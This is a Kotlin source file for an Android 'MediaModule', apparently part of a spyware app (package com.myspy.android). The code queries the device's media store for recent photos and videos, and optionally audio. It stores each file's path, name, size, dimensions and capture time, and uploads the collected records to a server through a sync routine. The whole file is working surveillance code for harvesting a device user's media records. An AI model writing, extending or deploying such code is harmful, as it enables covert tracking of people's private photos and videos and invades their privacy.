package com.myspy.android.modules.media

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.myspy.android.data.local.db.entities.MediaEntity
import com.myspy.android.data.repository.MediaRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Media Monitoring Module
 * Monitors photos, videos, and audio files on device
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class MediaModule(
    private val context: Context,
    private val repository: MediaRepository,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "MediaModule"

        private val REQUIRED_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            )
        } else {
            arrayOf(
                Manifest.permission.READ_EXTERNAL_STORAGE
            )
        }
    }

    private var isRunning = false
    private var lastCollectionTime = 0L

    /**
     * Check if all required permissions are granted
     */
    fun hasPermissions(): Boolean {
        return REQUIRED_PERMISSIONS.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }

    /**
     * Start monitoring media
     */
    fun start() {
        if (!hasPermissions()) {
            Log.w(TAG, "Missing permissions for media monitoring")
            return
        }

        if (isRunning) {
            Log.d(TAG, "MediaModule already running")
            return
        }

        Log.i(TAG, "Starting MediaModule")
        isRunning = true

        // Collect existing media immediately
        collectMedia()
    }

    /**
     * Stop monitoring media
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping MediaModule")
        isRunning = false
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        if (!hasPermissions()) {
            return Result.failure(Exception("Missing permissions"))
        }

        Log.d(TAG, "Syncing media data to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced media items
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Refresh media list (call periodically)
     */
    fun refreshMedia() {
        if (!isRunning) return

        val currentTime = System.currentTimeMillis()
        // Don't refresh more than once per hour
        if (currentTime - lastCollectionTime < 3600000) {
            Log.d(TAG, "Media was recently refreshed, skipping")
            return
        }

        collectMedia()
    }

    /**
     * Collect all media files from device
     */
    private fun collectMedia() {
        scope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "Collecting media files")
                val mediaList = mutableListOf<MediaEntity>()

                // Collect photos
                mediaList.addAll(collectImages())

                // Collect videos
                mediaList.addAll(collectVideos())

                // Collect audio (optional, can be large)
                // mediaList.addAll(collectAudio())

                if (mediaList.isNotEmpty()) {
                    repository.saveMultiple(mediaList)
                    lastCollectionTime = System.currentTimeMillis()
                    Log.i(TAG, "Collected ${mediaList.size} media files")
                } else {
                    Log.d(TAG, "No media files found")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting media files", e)
            }
        }
    }

    /**
     * Collect images from MediaStore
     */
    private fun collectImages(): List<MediaEntity> {
        val imagesList = mutableListOf<MediaEntity>()

        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT,
                MediaStore.Images.Media.DATE_TAKEN
            )

            val cursor: Cursor? = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_TAKEN} DESC LIMIT 200"
            )

            cursor?.use {
                val idIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val mimeIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
                val widthIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)
                val heightIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)
                val dateIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN)

                while (it.moveToNext()) {
                    try {
                        val filePath = it.getString(dataIndex)
                        val fileName = it.getString(nameIndex)
                        val fileSize = it.getLong(sizeIndex)
                        val mimeType = it.getString(mimeIndex)
                        val width = it.getInt(widthIndex)
                        val height = it.getInt(heightIndex)
                        val timestamp = it.getLong(dateIndex)

                        imagesList.add(
                            MediaEntity(
                                mediaType = "PHOTO",
                                filePath = filePath,
                                fileName = fileName,
                                fileSize = fileSize,
                                mimeType = mimeType,
                                width = width,
                                height = height,
                                duration = null,
                                timestamp = timestamp,
                                synced = false
                            )
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Error processing image row", e)
                    }
                }
            }

            Log.d(TAG, "Collected ${imagesList.size} images")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting images", e)
        }

        return imagesList
    }

    /**
     * Collect videos from MediaStore
     */
    private fun collectVideos(): List<MediaEntity> {
        val videosList = mutableListOf<MediaEntity>()

        try {
            val projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.MIME_TYPE,
                MediaStore.Video.Media.WIDTH,
                MediaStore.Video.Media.HEIGHT,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_TAKEN
            )

            val cursor: Cursor? = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Video.Media.DATE_TAKEN} DESC LIMIT 100"
            )

            cursor?.use {
                val idIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
                val nameIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)
                val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
                val mimeIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE)
                val widthIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH)
                val heightIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT)
                val durationIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)
                val dateIndex = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_TAKEN)

                while (it.moveToNext()) {
                    try {
                        val filePath = it.getString(dataIndex)
                        val fileName = it.getString(nameIndex)
                        val fileSize = it.getLong(sizeIndex)
                        val mimeType = it.getString(mimeIndex)
                        val width = it.getInt(widthIndex)
                        val height = it.getInt(heightIndex)
                        val duration = it.getLong(durationIndex)
                        val timestamp = it.getLong(dateIndex)

                        videosList.add(
                            MediaEntity(
                                mediaType = "VIDEO",
                                filePath = filePath,
                                fileName = fileName,
                                fileSize = fileSize,
                                mimeType = mimeType,
                                width = width,
                                height = height,
                                duration = duration,
                                timestamp = timestamp,
                                synced = false
                            )
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Error processing video row", e)
                    }
                }
            }

            Log.d(TAG, "Collected ${videosList.size} videos")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting videos", e)
        }

        return videosList
    }

    /**
     * Collect audio files from MediaStore (optional)
     */
    private fun collectAudio(): List<MediaEntity> {
        val audioList = mutableListOf<MediaEntity>()

        try {
            val projection = arrayOf(
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.DATA,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.MIME_TYPE,
                MediaStore.Audio.Media.DURATION,
                MediaStore.Audio.Media.DATE_ADDED
            )

            val cursor: Cursor? = context.contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                projection,
                "${MediaStore.Audio.Media.IS_MUSIC} = 1", // Only music files
                null,
                "${MediaStore.Audio.Media.DATE_ADDED} DESC LIMIT 100"
            )

            cursor?.use {
                val nameIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)
                val sizeIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE)
                val mimeIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.MIME_TYPE)
                val durationIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)
                val dateIndex = it.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_ADDED)

                while (it.moveToNext()) {
                    try {
                        val filePath = it.getString(dataIndex)
                        val fileName = it.getString(nameIndex)
                        val fileSize = it.getLong(sizeIndex)
                        val mimeType = it.getString(mimeIndex)
                        val duration = it.getLong(durationIndex)
                        val timestamp = it.getLong(dateIndex) * 1000 // Convert to milliseconds

                        audioList.add(
                            MediaEntity(
                                mediaType = "AUDIO",
                                filePath = filePath,
                                fileName = fileName,
                                fileSize = fileSize,
                                mimeType = mimeType,
                                width = null,
                                height = null,
                                duration = duration,
                                timestamp = timestamp,
                                synced = false
                            )
                        )
                    } catch (e: Exception) {
                        Log.w(TAG, "Error processing audio row", e)
                    }
                }
            }

            Log.d(TAG, "Collected ${audioList.size} audio files")
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting audio files", e)
        }

        return audioList
    }
}
